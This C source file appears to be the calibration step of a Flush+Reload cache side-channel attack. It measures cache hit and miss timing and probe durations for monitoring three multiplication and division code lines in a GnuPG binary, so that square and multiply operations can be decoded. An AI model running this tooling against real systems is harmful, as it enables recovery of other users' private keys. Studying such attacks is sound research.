/*
 * Calibrate the Flush+Reload parameters for THIS machine, then print:
 *     THRESHOLD=<cycles> SLOT=<cycles>
 * run.sh captures that and compiles FR-attack with -DTHRESHOLD -DSLOT.
 *
 * Why this matters (see issue.md):
 *  - THRESHOLD: a cache hit and a memory miss take different numbers of cycles,
 *    and the boundary is machine-specific. We measure both and split them.
 *  - SLOT: each slot probes 3 cache lines; if a slot is SHORTER than that probe
 *    takes, every slot overruns, slots are missed, and the decoded bitstream
 *    loses bits. So SLOT must exceed the measured 3-probe time.
 *
 *   gcc -I mastik -o calibrate src/calibrate.c -L mastik/src -lmastik -ldwarf -lelf -lbfd
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <mastik/symbol.h>
#include <mastik/fr.h>
#include <mastik/util.h>
#include <mastik/low.h>

#define N 4000
static int cmp(const void *a, const void *b){ return *(uint32_t*)a - *(uint32_t*)b; }

int main(int ac, char **av) {
  if (ac < 2) { fprintf(stderr, "Usage: %s <gpg-binary>\n", av[0]); exit(1); }

  /* --- 1. hit vs miss timing (single process, deterministic) --- */
  char *buf = malloc(4096);
  void *v = buf + 128;
  uint32_t hit[N], miss[N];
  for (int i = 0; i < N; i++) { memaccess(v); mfence(); hit[i]  = memaccesstime(v); }
  for (int i = 0; i < N; i++) { clflush(v);  mfence(); miss[i] = memaccesstime(v); }
  qsort(hit, N, 4, cmp); qsort(miss, N, 4, cmp);
  uint32_t hit_p90 = hit[N*9/10], miss_p10 = miss[N/10];
  /* threshold two-thirds of the way from hit to miss: catches shared-L2/L3
     cross-thread hits (slower than a local L1 hit) while staying below misses */
  int threshold = hit_p90 + (int)((miss_p10 - hit_p90) * 0.65);

  /* --- 2. time to probe all 3 monitored lines, as FR-attack does --- */
  const char *s[] = {"mpih-mul.c:85","mpih-mul.c:271","mpih-div.c:356"};
  fr_t fr = fr_prepare();
  for (int i = 0; i < 3; i++) {
    uint64_t off = sym_getsymboloffset(av[1], s[i]);
    if (off == ~0ULL) { fprintf(stderr, "symbol %s not found\n", s[i]); exit(1); }
    fr_monitor(fr, map_offset(av[1], off));
  }
  uint16_t res[3]; fr_probe(fr, res);
  uint32_t pt[N];
  for (int i = 0; i < N; i++) { uint64_t a = rdtscp64(); fr_probe(fr, res); pt[i] = rdtscp64()-a; }
  qsort(pt, N, 4, cmp);
  uint32_t probe_med = pt[N/2];
  /* Just above the typical (median) probe time: large enough that slots rarely
     overrun, small enough to still resolve individual operations. The median is
     used (not p90) because tail jitter would otherwise push the slot too high
     and blur the per-operation timing. Clamp to the empirically good window. */
  int slot = (int)(probe_med * 1.20);
  /* Floor/ceiling only guard against pathological probe-time measurements; the
     slot should track the measured probe time. A low floor matters on fast
     CPUs (e.g. 13th-gen Core): there the 3-probe time is ~800-1400 cyc, and an
     over-high floor forces an over-long slot that overruns the (very fast)
     square/multiply operations and drops squares -- fragmenting every
     exponentiation. On slower CPUs probe_med*1.2 already lands ~2500, well
     above this floor, so they are unaffected. */
  if (slot < 1200) slot = 1200;
  if (slot > 2900) slot = 2900;

  fprintf(stderr,
    "calibrate: hit~%u cyc, miss~%u cyc -> THRESHOLD=%d ; 3-probe median=%u cyc -> SLOT=%d\n",
    hit[N/2], miss[N/2], threshold, probe_med, slot);
  printf("THRESHOLD=%d SLOT=%d\n", threshold, slot);
  return 0;
}
